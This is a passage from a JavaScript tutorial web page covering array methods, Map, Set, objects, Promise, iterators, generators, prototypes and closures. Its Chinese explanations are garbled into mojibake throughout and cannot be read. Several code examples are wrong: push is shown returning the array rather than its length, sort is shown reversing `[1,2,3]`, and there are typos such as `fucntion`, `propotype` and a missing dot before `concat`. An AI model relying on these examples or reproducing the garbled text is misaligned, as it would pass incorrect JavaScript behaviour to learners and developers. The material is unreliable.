style="text-align:center">è¿æ¥ä¸¤ä¸ªæ•°ç»„å¹¶è¿”å›ä¸€ä¸ªæ–°çš„æ•°ç»„</td></tr></tbody></table><table><thead><tr><th></th><th style="text-align:center">æ•°ç»„çš„æ–¹æ³•</th></tr></thead><tbody><tr><td>concat</td><td style="text-align:center">è¿æ¥ä¸¤ä¸ªæ•°ç»„å¹¶è¿”å›ä¸€ä¸ªæ–°çš„æ•°ç»„ <code>[1,2,3]concat(&#39;a&#39;,&#39;b&#39;); // [1,2,3,&#39;a&#39;,&#39;b&#39;]</code></td></tr><tr><td>join</td><td style="text-align:center">å°†æ•°ç»„çš„æ‰€æœ‰å…ƒç´ è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸² <code>[1,2,3].join(&#39;-&#39;) // 1-2-3</code></td></tr><tr><td>push</td><td style="text-align:center">åœ¨æ•°ç»„æœ«å°¾æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›æ•°ç»„æ“ä½œåçš„é•¿åº¦ <code>[1,2,3].push(1) // [1,2,3,1]</code></td></tr><tr><td>pop</td><td style="text-align:center">ä»æ•°ç»„ç§»å‡ºæœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ ã€‚</td></tr><tr><td>shift</td><td style="text-align:center">ä»æ•°ç»„ç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </td></tr><tr><td>unshift</td><td style="text-align:center">ä»æ•°ç»„å¼€å¤´æ·»åŠ å…ƒç´  <code>[1,2,3].unshift(4,5) // [4,5,1,2,3]</code></td></tr><tr><td>slice</td><td style="text-align:center">ä»æ•°ç»„æå–ä¸€ä¸ªç‰‡æ®µï¼Œå¹¶ä½œä¸ºä¸€ä¸ªæ–°æ•°ç»„ <code>[1,2,3,4].slice(0,2) // [1,2]</code></td></tr><tr><td>splice</td><td style="text-align:center">ä»æ•°ç»„ç§»å‡ºä¸€äº›å…ƒç´ ï¼Œå¹¶æ›¿æ¢å®ƒä»¬ <code>slice(index, count_to_move, addElement1, addElement2);[1,2,3,4,5].splice(1,3,&#39;a&#39;,&#39;b&#39;) // [1,&#39;a&#39;,&#39;b&#39;,5]</code></td></tr><tr><td>reverse</td><td style="text-align:center">é¢ å€’æ•°ç»„å…ƒç´ çš„é¡ºåº <code>[1,2,3].reverse() // [3,2,1]</code></td></tr><tr><td>sort</td><td style="text-align:center">ç»™æ•°ç»„å…ƒç´ æ’åº <code>[1,2,3].sort() // [3,2,1]</code></td></tr><tr><td>indexOf</td><td style="text-align:center">åœ¨æ•°ç»„ä¸­æœç´¢searchElement å¹¶è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç´¢å¼• <code>[1,1,1,2].indexOf(2,1) // 3 indexOf(searchElement, fromIndex)</code></td></tr><tr><td>lastIndexOf</td><td style="text-align:center">å’ŒindexOfå·®ä¸å¤šï¼Œä»ç»“å°¾å¼€å§‹ï¼Œåå‘æœç´¢ </td></tr><tr><td>forEach</td><td style="text-align:center">åœ¨æ•°ç»„æ¯ä¸ªå…ƒç´ ä¸Šæ‰§è¡Œcallback <code>[1,2,3].forEach(fucntion(item){ callback(item); })</code></td></tr><tr><td>map</td><td style="text-align:center">åœ¨æ•°ç»„æ¯ä¸ªå…ƒç´ ä¸Šæ‰§è¡Œcallbackï¼Œå°†æ‰€æœ‰æ“ä½œç»“æœæ”¾å…¥æ•°ç»„ä¸­ï¼Œè¿”å›è¯¥æ–°æ•°ç»„ <code>[1,2,3].map(function(item){ return callback(item) })</code></td></tr><tr><td>filter</td><td style="text-align:center">è¿”å›ä¸€ä¸ªåœ¨å›è°ƒå‡½æ•°ä¸Šè¿”å›trueçš„å…ƒç´ çš„æ–°æ•°ç»„ <code>[1,&#39;a&#39;].filter(function(item){ return typeof item === &#39;number&#39;}) // [1]</code></td></tr><tr><td>every</td><td style="text-align:center">å½“æ•°ç»„ä¸­æ¯ä¸€ä¸ªå…ƒç´ åœ¨callbackä¸Šè¢«è¿”å›trueæ—¶ï¼Œå°±è¿”å›true <code>[1, 2].every(function(item){ return typeof item === &#39;number&#39;}) // true</code></td></tr><tr><td>some</td><td style="text-align:center">åªè¦æ•°ç»„ä¸­æœ‰ä¸€é¡¹åœ¨callbackä¸Šè¢«è¿”å›trueï¼Œå°±è¿”å›true <code>[1,&#39;a&#39;].some(function(item){ return typeof item === &#39;number&#39;}) // true</code></td></tr><tr><td>reduce</td><td style="text-align:center">ä½¿ç”¨callback(firstValue, secondValue)æŠŠæ•°ç»„åˆ—è¡¨è®¡ç®—æˆä¸€ä¸ªå•ä¸€å€¼ã€‚ <code>[1,2].reduce(function(first,second){ return first + second}, 0) // 3</code></td></tr><tr><td>reduceRight</td><td style="text-align:center">å’Œreduceç›¸ä¼¼ï¼Œä»æœ€åä¸€ä¸ªå…ƒç´ å¼€å§‹</td></tr><tr><td>toString</td><td style="text-align:center">è¿”å›ä¸€ä¸ªåŒ…å«æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ çš„å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå…ƒç´ é€šè¿‡é€—å·åˆ†éš”</td></tr></tbody></table><p><code>Array.slice</code><br>slice ä¸ä¼šä¿®æ”¹åŸæ•°ç»„ï¼Œåªä¼šè¿”å›ä¸€ä¸ªæµ…å¤åˆ¶äº†åŸæ•°ç»„ä¸­çš„å…ƒç´ çš„ä¸€ä¸ªæ–°æ•°ç»„ã€‚åŸæ•°ç»„çš„å…ƒç´ ä¼šæŒ‰ç…§ä¸‹è¿°è§„åˆ™æ‹·è´ï¼š</p><p>å¦‚æœè¯¥å…ƒç´ æ˜¯ä¸ªå¯¹è±¡å¼•ç”¨ ï¼ˆä¸æ˜¯å®é™…çš„å¯¹è±¡ï¼‰ï¼Œslice ä¼šæ‹·è´è¿™ä¸ªå¯¹è±¡å¼•ç”¨åˆ°æ–°çš„æ•°ç»„é‡Œã€‚ä¸¤ä¸ªå¯¹è±¡å¼•ç”¨éƒ½å¼•ç”¨äº†åŒä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœè¢«å¼•ç”¨çš„å¯¹è±¡å‘ç”Ÿæ”¹å˜ï¼Œåˆ™æ–°çš„å’ŒåŸæ¥çš„æ•°ç»„ä¸­çš„è¿™ä¸ªå…ƒç´ ä¹Ÿä¼šå‘ç”Ÿæ”¹å˜ã€‚<br>å¯¹äºå­—ç¬¦ä¸²ã€æ•°å­—åŠå¸ƒå°”å€¼æ¥è¯´ï¼ˆä¸æ˜¯ Stringã€Number æˆ–è€… Boolean å¯¹è±¡ï¼‰ï¼Œslice ä¼šæ‹·è´è¿™äº›å€¼åˆ°æ–°çš„æ•°ç»„é‡Œã€‚åœ¨åˆ«çš„æ•°ç»„é‡Œä¿®æ”¹è¿™äº›å­—ç¬¦ä¸²æˆ–æ•°å­—æˆ–æ˜¯å¸ƒå°”å€¼ï¼Œå°†ä¸ä¼šå½±å“å¦ä¸€ä¸ªæ•°ç»„</p><p><br></p><h4 id="1-11-Mapå¯¹è±¡"><a href="#1-11-Mapå¯¹è±¡" class="headerlink" title="1.11 Mapå¯¹è±¡"></a>1.11 Mapå¯¹è±¡</h4><p>ä¸€ä¸ªMapå¯¹è±¡æ˜¯ä¸€ä¸ªç®€å•çš„é”®å€¼å¯¹æ˜ å°„é›†åˆï¼Œå¯ä»¥æŒ‰ç…§æ•°æ®æ’å…¥æ—¶çš„é¡ºåºéå†æ‰€æœ‰çš„å…ƒç´ ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var a = new Map();</span><br><span class="line">a.set(&apos;dog&apos;, 123);</span><br><span class="line">a.size // 1</span><br><span class="line">a.get(&apos;fox&apos;) // undefined</span><br><span class="line">a.has(&apos;dog&apos;) // true</span><br><span class="line">a.delete(&apos;dog&apos;)</span><br><span class="line">for (var [key, value] of a)&#123;</span><br><span class="line">  console.log(key + value)</span><br><span class="line">&#125;</span><br><span class="line">a.clear()</span><br></pre></td></tr></table></figure></p><p><em>Objectå’ŒMapçš„å¯¹æ¯”</em><br>Objectè¢«ç”¨äºå°†å­—ç¬¦ä¸²ç±»å‹æ˜ å°„åˆ°æ•°å€¼ã€‚objectå…è®¸è®¾ç½®é”®å€¼å¯¹ã€æ ¹æ®é”®è·å–å€¼ï¼Œåˆ é™¤é”®ï¼Œæ£€æŸ¥æŸä¸ªé”®æ˜¯å¦å­˜åœ¨ã€‚è€ŒMapå…·æœ‰æ›´å¤šä¼˜åŠ¿ã€‚</p><ul><li>Objectçš„é”®å‡ä¸ºstringsç±»å‹ï¼Œåœ¨Mapé‡Œé”®å¯ä»¥æ˜¯ä»»æ„ç±»å‹</li><li>Objectçš„å°ºå¯¸å¿…é¡»æ‰‹åŠ¨è®¡ç®—ï¼ŒMapçš„å°ºå¯¸åˆ™å¾ˆå®¹æ˜“è·å¾—</li><li>Mapçš„éå†éµå¾ªå…ƒç´ çš„æ’å…¥é¡ºåº</li><li>Objectæœ‰åŸå‹ï¼Œæ‰€æœ‰æ˜ å°„ä¸­æœ‰ä¸€äº›ç¼ºçœçš„å€¼<br><br></li></ul><h4 id="1-12-Setå¯¹è±¡"><a href="#1-12-Setå¯¹è±¡" class="headerlink" title="1.12 Setå¯¹è±¡"></a>1.12 Setå¯¹è±¡</h4><p>Setå¯¹è±¡æ˜¯ä¸€ç»„å€¼å¾—é›†åˆï¼Œè¿™äº›å€¼éƒ½æ˜¯ä¸é‡å¤çš„ï¼Œ å¯ä»¥æŒ‰ç…§æ·»åŠ é¡ºåºæ¥éå†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var a = new Set();</span><br><span class="line">a.add(1);</span><br><span class="line">a.add(&apos;foo&apos;);</span><br><span class="line">a.has(1);</span><br><span class="line">a.delete(1);</span><br><span class="line">a.size</span><br><span class="line">for(let item of a)&#123; console.log(item) &#125;</span><br><span class="line"></span><br><span class="line">// Arrayå’ŒSetçš„è½¬æ¢</span><br><span class="line">Array.from(mySet);</span><br><span class="line">mySet = new Set([1,2,3])</span><br></pre></td></tr></table></figure></p><p><em>Arrayå’ŒSetçš„å¯¹æ¯”</em></p><ul><li>æ•°ç»„ä¸­åˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨çš„<code>indexOf</code>å‡½æ•°æ•ˆç‡ä½ä¸‹</li><li>Setå…è®¸æ ¹æ®å€¼åˆ é™¤å…ƒç´ ï¼Œè€Œæ•°ç»„ä¸­å¿…é¡»ç”¨spliceæ–¹æ³•</li><li>Arrayçš„indexOfæ— æ³•æ‰¾åˆ°NaNå€¼</li><li>Setå¯¹è±¡å­˜å‚¨ä¸é‡å¤çš„å€¼<br><br></li></ul><h4 id="1-13-Object"><a href="#1-13-Object" class="headerlink" title="1.13 Object"></a>1.13 Object</h4><ul><li><p>æšä¸¾ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§<br>forâ€¦in, Object.keys(obj), Object.getOwnPropertyNames(obj)</p></li><li><p>åˆ›å»ºæ–°å¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 1. ä½¿ç”¨å¯¹è±¡åˆå§‹åŒ–å™¨</span><br><span class="line">var obj = &#123; property_1: value_1 &#125;</span><br><span class="line"></span><br><span class="line">// 2. ä½¿ç”¨æ„é€ å‡½æ•°ï¼Œé€šè¿‡newåˆ›å»ºå¯¹è±¡å®ä¾‹</span><br><span class="line">function Car(make)&#123;</span><br><span class="line">  this.make = make;</span><br><span class="line">&#125;</span><br><span class="line">var myCar = new Car(&apos;Eagle&apos;)</span><br><span class="line"></span><br><span class="line">// ä½ å¯ä»¥é€šè¿‡prototypeå±æ€§ä¸ºä¹‹å‰å®šä¹‰çš„å¯¹è±¡ç±»å‹å¢åŠ å±æ€§ã€‚è¯¥ç±»å‹çš„æ‰€æœ‰å¯¹è±¡ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªã€‚</span><br><span class="line">Car.propotype.color = null;</span><br><span class="line"></span><br><span class="line">// 3. ä½¿ç”¨Object.createæ–¹æ³•, å®ƒå…è®¸ä½ ä¸ºåˆ›å»ºçš„å¯¹è±¡é€‰æ‹©å…¶åŸå‹å¯¹è±¡ï¼Œè€Œä¸ç”¨å®šä¹‰ä¸€ä¸ªæ„é€ å‡½æ•°ã€‚</span><br><span class="line">var Animal = &#123;</span><br><span class="line">  type: &apos;Invertebrrates&apos;,</span><br><span class="line">  displayType: function()&#123;</span><br><span class="line">    console.log(this.type)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var animal1 = Object.create(Animal)</span><br></pre></td></tr></table></figure></li><li><p><em>this</em><br><code>this</code>åœ¨æ–¹æ³•ä¸­ä½¿ç”¨ä»¥æŒ‡ä»£å½“å‰å¯¹è±¡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function validate(obj, lowval)&#123;</span><br><span class="line">  if (obj.value &lt; lowval) &#123;</span><br><span class="line">    alert(&apos;Invalid Value&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// åœ¨æ¯ä¸ªå…ƒç´ çš„oncahngeäº‹ä»¶å¤„ç†å™¨ä¸­è°ƒç”¨validateï¼Œå¹¶é€šè¿‡thisä¼ å…¥ç›¸åº”å…ƒç´ </span><br><span class="line">&lt;input onChange=&quot;validate(this, 18)&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>getterä¸setter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123; a: 0 &#125;;</span><br><span class="line">Object.defineProperties(o, &#123;</span><br><span class="line">  &quot;b&quot;: &#123; get: function() &#123; return this.a + 1 &#125;&#125;,</span><br><span class="line">  &quot;c&quot;: &#123; set: function(x) &#123; this.a = x / 2 &#125;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤å±æ€§: <code>delete myobj.a</code></p></li><li>æ¯”è¾ƒå¯¹è±¡: ä¸¤ä¸ªç‹¬ç«‹å£°æ˜çš„å¯¹è±¡æ°¸è¿œä¸ä¼šç›¸ç­‰ï¼Œå³ä½¿ä»–ä»¬æœ‰ç›¸åŒçš„å±æ€§ï¼Œåªæœ‰åœ¨æ¯”è¾ƒä¸€ä¸ªå¯¹è±¡å’Œè¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œæ‰ä¼šè¿”å›true.<br><br></li></ul><h4 id="1-14-Promise"><a href="#1-14-Promise" class="headerlink" title="1.14 Promise"></a>1.14 Promise</h4><p>ä¸€ä¸ªPromiseå°±æ˜¯ä¸€ä¸ªä»£è¡¨äº†å¼‚æ­¥æ“ä½œæœ€ç»ˆå®Œæˆæˆ–è€…å¤±è´¥çš„å¯¹è±¡ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doSomething().then(doSomethingElse, failureCallback)</span><br><span class="line">doSomething()</span><br><span class="line">.then(result =&gt; doSomethingElse(result))</span><br><span class="line">.catch(failureCallback)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-15-è¿­ä»£å™¨å’Œç”Ÿæˆå™¨"><a href="#1-15-è¿­ä»£å™¨å’Œç”Ÿæˆå™¨" class="headerlink" title="1.15 è¿­ä»£å™¨å’Œç”Ÿæˆå™¨"></a>1.15 è¿­ä»£å™¨å’Œç”Ÿæˆå™¨</h4><ul><li><em>è¿­ä»£å™¨</em><br>ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ï¼ŒçŸ¥é“å¦‚ä½•æ¯æ¬¡è®¿é—®é›†åˆä¸­çš„ä¸€é¡¹ï¼Œå¹¶è·Ÿè¸ªè¯¥åºåˆ—ä¸­çš„å½“å‰ä½ç½®ã€‚è¿­ä»£å™¨æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæä¾›äº†<code>next()</code>æ–¹æ³•ï¼Œç”¨æ¥è¿”å›åºåˆ—ä¸­çš„ä¸‹ä¸€é¡¹ã€‚è¿™ä¸ªæ–¹æ³•åŒ…å«<code>value</code>å’Œ<code>done</code>ä¸¤ä¸ªå±æ€§ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function makeIterator(array)&#123;</span><br><span class="line">  var nextIndex = 0;</span><br><span class="line">  return &#123;</span><br><span class="line">    next: function() &#123;</span><br><span class="line">      return nextIndex &lt; array.length ? &#123; value: array[nextIndex++], done: false &#125; : &#123; done: true &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var it = makeIterator([1,2]);</span><br><span class="line">console.log(it.next().value) // 1</span><br><span class="line">console.log(it.next().value) // 2</span><br><span class="line">console.log(it.next().done)  // true</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>ç”Ÿæˆå™¨</em><br>ä½¿ç”¨<code>function*</code>è¯­æ³•ï¼Œå‡½æ•°å°†å˜æˆGeneratorFunctionã€‚å®ƒå…è®¸ä½ å®šä¹‰ä¸€ä¸ªåŒ…å«è‡ªæœ‰è¿­ä»£ç®—æ³•çš„å‡½æ•°ï¼ŒåŒæ—¶å®ƒå¯ä»¥è‡ªåŠ¨ç»´æŠ¤è‡ªå·±çš„çŠ¶æ€<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function* idMaker()&#123;</span><br><span class="line">  var index = 0;</span><br><span class="line">  while(true)</span><br><span class="line">    yield index++;</span><br><span class="line">&#125;</span><br><span class="line">var gen = idMaker();</span><br><span class="line">console.log(gen.next().value) // 0</span><br><span class="line">console.log(gen.next().value) // 1</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-ä¸­çº§"><a href="#2-ä¸­çº§" class="headerlink" title="2. ä¸­çº§"></a>2. ä¸­çº§</h3><h4 id="2-1-åŸå‹é“¾"><a href="#2-1-åŸå‹é“¾" class="headerlink" title="2.1 åŸå‹é“¾"></a>2.1 åŸå‹é“¾</h4><p>JSå¸¸è¢«æè¿°ä¸ºä¸€ç§<strong>åŸºäºåŸå‹çš„è¯­è¨€</strong>â€”â€”æ¯ä¸ªå¯¹è±¡æ‹¥æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œå¯¹è±¡ä»¥å…¶åŸå‹ä¸ºæ¨¡æ¿ã€ä»åŸå‹ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ã€‚åŸå‹å¯¹è±¡ä¹Ÿå¯èƒ½æ‹¥æœ‰åŸå‹ï¼Œå¹¶ä»ä¸­ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ï¼Œä¸€å±‚ä¸€å±‚ï¼Œè¿™ç§å…³ç³»å¸¸è¢«ç§°ä¸º<strong>åŸå‹é“¾</strong>ã€‚å‡†ç¡®åœ°è¯´ï¼Œè¿™äº›å±æ€§å’Œæ–¹æ³•å®šä¹‰åœ¨Objectæ„é€ å™¨(constructor functions)ä¹‹ä¸Šçš„<code>prototype</code>å±æ€§ä¸Šï¼Œè€Œéå¯¹è±¡å®ä¾‹æœ¬èº«ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function a()&#123;&#125;;</span><br><span class="line">a.prototype.foo = &apos;bar&apos;;</span><br><span class="line">console.log(a.prototype)</span><br><span class="line">  &#123;</span><br><span class="line">    foo: &apos;bar&apos;,</span><br><span class="line">    constructor: Æ’ a(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        constructor: Æ’ Object(),</span><br><span class="line">        hasOwnProperty: Æ’ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: Æ’ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: Æ’ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: Æ’ toLocaleString(),</span><br><span class="line">        toString: Æ’ toString(),</span><br><span class="line">        valueOf: Æ’ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// newä¸€ä¸ªå®ä¾‹</span><br><span class="line">var b = new a();</span><br><span class="line">b.prop = &quot;some value&quot;;</span><br><span class="line">console.log(b)</span><br></pre></td></tr></table></figure></p><ul><li><p><em>prototypeå±æ€§</em>: ç»§æ‰¿æˆå‘˜è¢«å®šä¹‰çš„åœ°æ–¹<br><code>Object.prototype.watch()</code>ç­‰æˆå‘˜ï¼Œé€‚ç”¨äºä»»ä½•ç»§æ‰¿è‡ª<code>Object()</code>çš„å¯¹è±¡ç±»å‹ï¼ŒåŒ…æ‹¬ä½¿ç”¨æ„é€ å™¨åˆ›å»ºçš„æ–°çš„å¯¹è±¡å®ä¾‹ã€‚<br><code>Object.watch()</code>ä»¥åŠå…¶ä»–ä¸åœ¨<code>prototype</code>å¯¹è±¡å†…çš„æˆå‘˜ï¼Œä¸ä¼šè¢«å¯¹è±¡å®ä¾‹ï¼Œæˆ–ç»§æ‰¿è‡ªObject()çš„å¯¹è±¡ç±»å‹æ‰€ç»§æ‰¿ã€‚</p></li><li><p><em>constructorå±æ€§</em><br>æ¯ä¸ªå®ä¾‹å¯¹è±¡éƒ½ä»åŸå‹ä¸­ç»§æ‰¿äº†ä¸€ä¸ªconstructorå±æ€§ï¼Œè¯¥å±æ€§æŒ‡å‘äº†ç”¨äºæ„é€ æ­¤å®ä¾‹å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person1.constructor éƒ½å°†è¿”å›Person()æ„é€ å™¨</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-é‡æ–°ä»‹ç»JS"><a href="#2-2-é‡æ–°ä»‹ç»JS" class="headerlink" title="2.2 é‡æ–°ä»‹ç»JS"></a>2.2 é‡æ–°ä»‹ç»JS</h4><ul><li>ä¸å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸é€šï¼ŒJSæ²¡æœ‰è¾“å…¥æˆ–è¾“å‡ºçš„æ¦‚å¿µã€‚å®ƒæ˜¯ä¸€ä¸ªåœ¨ä¸»æœºç¯å¢ƒä¸‹è¿è¡Œçš„è„šæœ¬è¯­è¨€ï¼Œä»»ä½•ä¸å¤–ç•Œæ²Ÿé€šçš„æœºåˆ¶éƒ½æ˜¯ç”±ä¸»æœºç¯å¢ƒæä¾›çš„ã€‚æµè§ˆå™¨æ˜¯æœ€å¸¸è§çš„ä¸»æœºç¯å¢ƒï¼Œä½†å¾ˆå¤šç¨‹åºä¸­ä¹ŸåŒ…å«JSè§£é‡Šå™¨ï¼Œå¦‚Adobe Acrobatã€Photoshopã€SVGå›¾åƒã€NodejsæœåŠ¡å™¨ã€‚</li><li>JSä¸åŒºåˆ†æ•´æ•°å€¼å’Œæµ®ç‚¹æ•°å€¼ï¼Œæ‰€æœ‰æ•°å­—åœ¨JSä¸­å‡ç”¨æµ®ç‚¹æ•°å€¼è¡¨ç¤ºã€‚<br><code>0.1 + 0.2 = 0.30000000000000004</code></li><li><code>null</code>è¡¨ç¤ºä¸€ä¸ªç©ºå€¼ï¼Œ<code>undefined</code>è¡¨ç¤ºä¸€ä¸ªæœªåˆå§‹åŒ–çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¿˜æ²¡è¢«åˆ†é…çš„å€¼ã€‚</li><li><code>&amp;&amp;</code>å’Œ<code>||</code>è¿ç®—ç¬¦ä½¿ç”¨çŸ­è·¯é€»è¾‘ï¼Œæ˜¯å¦ä¼šæ‰§è¡Œç¬¬äºŒä¸ªè¯­å¥å–å†³äºç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„ç»“æœã€‚</li><li>å‡½æ•°å¦‚æœæ²¡æœ‰ä½¿ç”¨<code>return</code>è¯­å¥ï¼ŒJSä¼šè¿”å›<code>undefined</code></li><li>JSå…è®¸ä½ åˆ›å»ºåŒ¿åå‡½æ•°<br><code>(function(){ var a = 1 })();</code></li><li>å¦‚æœåœ¨ä¸€ä¸ªå¯¹è±¡ä¸Šä½¿ç”¨ç‚¹æˆ–æ–¹æ‹¬å·æ¥è®¿é—®å±æ€§/æ–¹æ³•ï¼Œè¿™ä¸ªå¯¹è±¡å°±æˆäº†<code>this</code>ã€‚å¦‚æœæ²¡æœ‰ä½¿ç”¨ï¼Œé‚£ä¹ˆ<code>this</code>å°†æŒ‡å‘å…¨å±€å¯¹è±¡ã€‚</li><li>ä½ å¯ä»¥åœ¨ç¨‹åºä¸­çš„ä»»ä½•æ—¶å€™ä¿®æ”¹åŸå‹(prototype)ä¸­çš„ä¸€äº›ä¸œè¥¿ï¼Œä½ å¯ä»¥åœ¨è¿è¡Œæ—¶ç»™å·²å­˜åœ¨çš„å¯¹è±¡æ·»åŠ é¢å¤–çš„æ–¹æ³•ã€‚</li><li>ä½ å¯ä»¥åœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨å®šä¹‰å‡½æ•°ã€‚è¿™æ˜¯ä¸€ä¸ªå‡å°‘ä½¿ç”¨å…¨å±€å˜é‡çš„å¥½æ–¹æ³•ã€‚</li><li><em>é—­åŒ…</em><br>JSæ‰§è¡Œä¸€ä¸ªå‡½æ•°æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸå¯¹è±¡(scope object)ï¼Œç”¨æ¥ä¿å­˜è¿™ä¸ªå‡½æ•°ä¸­åˆ›å»ºçš„å±€éƒ¨å˜é‡ã€‚å®ƒå’Œè¢«ä¼ å…¥å‡½æ•°çš„å˜é‡ä¸€èµ·è¢«åˆå§‹åŒ–ã€‚ä¸å…¨å±€å¯¹è±¡ä¸åŒï¼Œä½ ä¸èƒ½ç›´æ¥è®¿é—®ä½œç”¨åŸŸå¯¹è±¡ï¼Œä¹Ÿæ²¡æœ‰å¯ä»¥éå†å½“å‰ä½œç”¨åŸŸå¯¹è±¡é‡Œå±æ€§çš„æ–¹æ³•ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function makeAdder(a) &#123;</span><br><span class="line">  return function(b) &#123;</span><br><span class="line">    return a + b</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var x = makeAdder(5);</span><br><span class="line">var y = makeAdder(20);</span><br><span class="line">x(6); // 11</span><br><span class="line">y(7); // 27</span><br></pre></td></tr></table></figure></li></ul><p>JSå…·æœ‰ä¸€ç§åƒåœ¾å›æ”¶æœºåˆ¶â€”â€”å¯¹è±¡åœ¨è¢«åˆ›å»ºçš„æ—¶å€™åˆ†é…å†…å­˜ï¼Œç„¶åå½“æŒ‡å‘è¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨è®¡æ•°ä¸ºé›¶æ—¶ï¼Œæµè§ˆå™¨ä¼šå›æ”¶å†…å­˜ã€‚é—­åŒ…å¾ˆå®¹æ˜“å‘ç”Ÿæ— æ„è¯†çš„å†…å­˜æ³„æ¼ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 